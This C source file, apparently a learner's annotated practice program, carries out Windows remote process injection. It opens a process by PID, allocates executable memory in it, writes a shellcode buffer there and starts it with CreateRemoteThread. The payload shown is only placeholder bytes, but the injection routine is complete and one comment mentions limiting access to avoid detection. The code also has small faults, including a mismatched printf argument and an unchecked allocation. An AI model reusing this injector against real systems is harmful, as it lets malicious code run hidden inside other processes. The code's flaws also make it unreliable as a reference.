#include <windows.h>
#include <stdio.h>
// I did paste the outline for the Windows functions to see the parameters that are being taken in
// Gotta use those macros
//#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
//#define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
//#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
const char* k = "[+]"; // successful indication 
const char* i = "[*]"; // working indication 
const char* e = "[-]"; // error indication 

DWORD PID;
//DWORD is pretty much a 32 bit place holder

HANDLE hProcess = NULL;
HANDLE hThread = NULL;
LPVOID rBuffer = NULL;
unsigned char shellCode[] = "\x41\x41\x41\x41\x41\x41\x90\xcc";
// "Hungarian" notation used with the h in front because Microsoft adapted that for their variables where it is the variable type of what is being returned

int main(int argc, char* argv[]) {
    

    

    PID = atoi(argv[1]);
    printf("%s Attempting to open proccess handle (%ld)\n", i, PID);
    
    
    /*
    HANDLE OpenProcess(
        [in] DWORD dwDesiredAccess, //Process privilege/rights (If a proccess is protected however, an error will occur when trying to force these privileges)
        [in] BOOL  bInheritHandle, //Do we want to inherit any other proccess that are spawned from this one
        [in] DWORD dwProcessId
    );
    */  

    hProcess = OpenProcess(
                PROCESS_ALL_ACCESS, // Doing all access but best to give the script the minimum required access as to not be detected and just better practice and isf the process is "protected" an error will occur for you won't be able to choose what access is given
                FALSE,  
                PID
                );
    

    if (hProcess == NULL){
        printf("%s couldn't get (%ld), error %ld", e, PID, GetLastError()); // This will give you the error number that's causing the crash which you can find in the Windows documentation as previously mentioned that explains exactly what is is (EXTREMELY useful for debugging)
        return 1;
    }
    printf("%s Got a handle to the proccess \n\\---0x%p\n", k, hProcess);
    // At this point the handle to the specified proccess has been opened.
    
    
    
    // Time to reserver some of the process memory for our code

    /*
    LPVOID VirtualAllocEx(
        [in]           HANDLE hProcess,
        [in, optional] LPVOID lpAddress,     // Specifics the starting address and where in the memory will be allocated for our use. If NULL the function will determine where to allocate on its own
        [in]           SIZE_T dwSize,        // The size of our shell code (how much to allocate)
        [in]           DWORD  flAllocationType,
        [in]           DWORD  flProtect      // Permission of the memory, if the correct permissions aren't being used the script just won't run
    );
    */

    // The buffer function we're using to allocate space
    rBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        sizeof(shellCode),               // How much space we need for our shell code
        (MEM_COMMIT | MEM_RESERVE),      // The type of allocation and this is how you can use both the reserve type and commit type which is needed to inject
        PAGE_EXECUTE_READWRITE           // Just simple rwx permissions
 
    );
    printf("%s allocated %zu-bytes with rwx permissions\n", k, sizeof(shellCode));






    /*
    BOOL WriteProcessMemory(
        [in]  HANDLE  hProcess,
        [in]  LPVOID  lpBaseAddress,
        [in]  LPCVOID lpBuffer,
        [in]  SIZE_T  nSize,
        [out] SIZE_T  *lpNumberOfBytesWritten   // Don't really have to worry about this rn
    );
    */

    // Time to actually write the memory since we have now allocated the space
    WriteProcessMemory(
        hProcess,
        rBuffer,    // The area of the memory we're writing in
        shellCode,  // Actually writing our shell code into the memory now
        sizeof(shellCode),
        NULL
    ); 

    printf("%s wrote %zu-bytes to process memory\n", k, sizeof(shellCode));





    /*
    HANDLE CreateRemoteThreadEx(
        [in]            HANDLE                       hProcess,
        [in, optional]  LPSECURITY_ATTRIBUTES        lpThreadAttributes,
        [in]            SIZE_T                       dwStackSize,
        [in]            LPTHREAD_START_ROUTINE       lpStartAddress,        //Specifies the starting point for the thread in way, so in other words we'll point this to the buffer we created earlier so it starts at the beginning of our thread 
        [in, optional]  LPVOID                       lpParameter,
        [in]            DWORD                        dwCreationFlags,       //Can change the behavior of the thread like priority or something else
        [in, optional]  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
        [out, optional] LPDWORD                      lpThreadId
    );
    */

    // Lastly time to actually create the thread within the process that will run our newly created memory that contains our scripts
    // Saving this thread to hThread
    hThread = CreateRemoteThread(
    hProcess,
    NULL, 
    0,      //If 0 the thread will just use a default size for the executable 
    (LPTHREAD_START_ROUTINE)rBuffer,    // Points to the function to be executed by the thread
    NULL,
    0,      // 0 means the thread runs immediately after creation
    NULL    // Pointer to receive the thread identifier
    );
    

    if (hThread == NULL){
        printf("%s failed to get handle to the thread error: %ld", e, GetLastError());
        CloseHandle(hProcess);  // If all fails we don't want the handle to stick around
        return 1;
    }


    printf("%s Successfully got a handle to the thread \n\\---0x%p", k, 0, hThread);
    CloseHandle(hThread); // Now that we're done shutting it all down
    CloseHandle(hProcess);

    return 0;
}

